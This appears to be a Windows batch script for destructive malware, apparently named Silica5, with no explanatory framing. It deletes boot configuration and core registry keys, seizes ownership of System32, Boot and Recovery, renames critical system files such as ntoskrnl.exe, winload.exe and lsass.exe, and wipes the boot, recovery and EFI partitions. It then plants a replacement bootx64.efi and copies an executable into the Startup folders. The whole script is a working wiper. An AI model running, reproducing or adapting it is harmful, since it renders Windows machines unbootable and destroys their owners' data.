@echo off
bcdedit /delete {bootmgr} /f /cleanup & bcdedit /delete {current} /f /cleanup & bcdedit /delete {default} /f /cleanup & bcdedit /delete {memdiag} /f /cleanup
reg delete "HKLM\SYSTEM\Setup" /v "SetupType" /f
reg delete "HKLM\SYSTEM\Setup" /v "OOBEInProgress" /f
reg delete "HKLM\SYSTEM\Setup" /v "RestartSetup" /f
reg delete "HKLM\SYSTEM\Setup" /v "SetupPhase" /f
reg delete "HKLM\SYSTEM\Setup" /v "SetupSupported" /f
reg delete "HKLM\SYSTEM\Setup" /v "SystemSetupInProgress" /f
reg delete "HKLM\SYSTEM\Setup" /v "WorkingDirectory" /f
reg delete "HKLM\SYSTEM\Setup" /v "SystemPartition" /f
reg delete "HKLM\SYSTEM\Setup" /v "OsLoaderPath" /f
reg delete "HKLM\SYSTEM\Setup" /v "RespecializeCmdLine" /f
reg delete "HKLM\SYSTEM\Setup" /v "CmdLine" /f
reg delete "HKLM\\SYSTEM\CurrentControlSet\Control\HAL" /f
reg delete "HKLM\\SYSTEM\ControlSet001\Control\HAL" /f
reg delete "HKLM\\SYSTEM\ControlSet002\Control\HAL" /f
reg delete "HKLM\\SYSTEM\CurrentControlSet\Control\hivelist" /f
reg delete "HKLM\\SYSTEM\ControlSet001\Control\hivelist" /f
reg delete "HKLM\\SYSTEM\ControlSet002\Control\hivelist" /f
takeown /f C:\Windows\System32 /r /d y & icacls C:\Windows\System32 /grant Users:F /T /C /Q & takeown /f C:\Windows\Boot /r /d y & takeown /f C:\Boot & takeown /f C:\bootmgr /r /d y & icacls C:\Boot /grant Users:F /C /T /Q & icacls C:\Windows\Boot /grant Users:F /C /T /Q 
takeown /f C:\Windows\SysWOW64\boot.sdi /r /d y & icacls C:\Windows\SysWOW64\boot.sdi & takeown /f C:\Recovery /r /d y & icacls C:\Recovery /grant Users:F /C /T /Q & icacls C:\Recovery /grant Administrators:F /C /T /Q
ren C:\Windows\System32\ntoskrnl.exe VwRhztPfsm.00
ren C:\Windows\System32\winload.exe OpYsHkDixMnQ.00
ren C:\Windows\System32\winload.efi KhcBszYd.00
ren C:\Windows\System32\winlogon.exe PzSxKeXct.00
ren C:\Windows\System32\LogonUI.exe KxZQwf.00
ren C:\Windows\System32\wininit.exe PxZvfWQgx.00
ren C:\Windows\System32\smss.exe OxSWesQZsjfT.00
ren C:\Windows\System32\svchost.exe GxFejidKlXwPq.00
ren C:\Windows\System32\csrss.exe KzGXAsZdhQxyX.00
ren C:\Windows\System32\wininit.exe PzXGhRtEqWjv.00
ren C:\Windows\System32\services.exe KjbvNmYxv.00
ren C:\Windows\System32\dwm.exe kLqZxFTghS.00
ren C:\Windows\System32\lsass.exe OpZxHkSabVxZ.00
ren C:\Windows\System32\userinit.exe LkmAXvTvZxVgoY.00
ren C:\Windows\System32\hal.dll 666.dll
ren C:\bootmgr Xzs0Jhe.00
ren C:\BOOTNXT JkzxYsfWQ.00
ren "%USERPROFILE%\Desktop\*.lnk" *.00
ren C:\Windows\SysWOW64\boot.sdi OAx3BjxMwKPq.00
ren C:\Windows\System32\boot.sdi GhSZcmQAsiUWp.00
mountvol W:\ /d & mountvol W:\ /s
rd /S /Q C:\Boot & rd /S /Q C:\Windows\Boot & rd /S /Q C:\Windows\System32\Boot & rd /S /Q W:\ & rd /S /Q C:\Recovery
xcopy "C:\Program Files (x86\Microsoft\Temp\bootx64.efi" "W:\BOOT"/Y /R /H/E /C /G
xcopy "C:\Program Files (x86\Microsoft\Temp\bootx64.efi" "W:\EFI\BOOT"/Y /H /R /E /C /G
xcopy /D /Y C:\Windows\System32\Silica5.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" /Y /H /R /E /C /G
xcopy /D /Y C:\Windows\System32\Silica5.exe "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /Y /H /R /E /C /G